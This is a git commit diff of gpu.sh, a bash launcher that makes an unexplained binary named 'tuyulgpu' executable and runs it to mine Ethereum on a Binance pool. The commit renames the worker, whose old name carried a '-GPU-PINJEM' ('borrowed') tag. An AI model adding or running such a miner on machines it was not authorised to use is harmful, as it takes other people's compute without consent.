e8b724c11fdc7ac10785b2629a679792266b1151
bruhinbru <85330115+bruhinbru@users.noreply.github.com>
2021-06-04 15:14:54 +0800

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=ethash.poolbinance.com:1800
-USER=EtherHin.001
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-EtherHin.001)
 
 chmod +x tuyulgpu
 ./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
